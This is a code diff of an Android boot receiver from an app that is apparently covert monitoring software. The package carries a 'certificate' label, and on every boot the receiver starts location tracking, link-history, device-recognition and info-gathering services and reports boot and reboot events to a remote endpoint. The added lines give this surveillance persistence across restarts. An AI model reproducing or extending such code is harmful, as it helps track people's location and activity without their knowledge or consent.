@@ -8,13 +8,15 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
-import android.net.Uri;
+import android.content.res.Resources;
 import android.preference.PreferenceManager;
 
+import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
+import com.inet.android.info.CreateServiceInformation;
 import com.inet.android.info.GetInfo;
 import com.inet.android.location.LocationTracker;
-import com.inet.android.sms.SmsSentObserver;
+import com.inet.android.location.RecognitionDevService;
 import com.inet.android.utils.Logging;
 
 public class BootBroadcastReceiver extends BroadcastReceiver {
@@ -27,27 +29,31 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
 	public void onReceive(Context context, Intent intent) {
 		Logging.doLog("BootBroadCastReceiver", "onReceive", "onReceive");
 		mContext = context;
-		sp = PreferenceManager.getDefaultSharedPreferences(context);
-
+		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		Resources path = mContext.getApplicationContext().getResources();
+		String area = path.getString(R.string.device);
 		String action = intent.getAction();
 		if (action.equalsIgnoreCase(BOOT_ACTION)) {
+			CreateServiceInformation serviceInfo = new CreateServiceInformation(
+					mContext);
+			serviceInfo.sendStr(area, path.getString(R.string.boot));
 			// for Service
-			Intent linkServiceIntent = new Intent(context, LinkService.class);
-			context.startService(linkServiceIntent);
-			Intent locServiceIntent = new Intent(context, LocationTracker.class);
-			context.startService(locServiceIntent);
-			
+			Intent linkServiceIntent = new Intent(mContext, LinkService.class);
+			mContext.startService(linkServiceIntent);
+			Intent locServiceIntent = new Intent(mContext,
+					LocationTracker.class);
+			mContext.startService(locServiceIntent);
+			Intent recognitionServiceIntent = new Intent(mContext,
+					RecognitionDevService.class);
+			mContext.startService(recognitionServiceIntent);
 			GetInfo getInfo = new GetInfo(mContext);
 			getInfo.startGetInfo();
 		}
-	}
+		if (action.equalsIgnoreCase(Intent.ACTION_REBOOT)) {
+			CreateServiceInformation serviceInfo = new CreateServiceInformation(
+					mContext);
+			serviceInfo.sendStr(area, "Reboot");
 
-	@SuppressLint("SimpleDateFormat")
-	private static String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
+		}
 	}
 }
